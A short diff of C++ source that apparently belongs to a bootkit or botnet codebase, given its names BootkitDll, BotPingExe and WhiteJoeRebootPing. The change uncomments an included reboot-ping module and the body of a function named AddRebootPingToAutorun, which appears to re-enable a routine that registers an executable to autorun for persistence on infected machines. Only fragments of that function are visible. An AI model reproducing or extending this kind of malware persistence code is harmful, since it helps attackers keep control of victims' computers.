@@ -47,12 +47,12 @@ namespace BootkitDll
 	#include "setupdll.cpp"
 }
 
-/*
+
 namespace BotPingExe
 {
 	#include "WhiteJoeRebootPing.cpp"
 }
-*/
+
 
 #pragma comment(linker, "/ENTRY:MyMain" )
 
@@ -219,7 +219,6 @@ DWORD WINAPI RebootNotifyThread(void* p)
 
 void AddRebootPingToAutorun()
 {
-/*
 	PP_DPRINTF("AddRebootPingToAutorun: started.");
 	void* exeFile;
 	DWORD size;
@@ -235,7 +234,6 @@ void AddRebootPingToAutorun()
 			PP_DPRINTF("AddRebootPingToAutorun: finished.");
 		}
 	}
-*/
 }
 
 void AddRebootPingDllToAutorun()
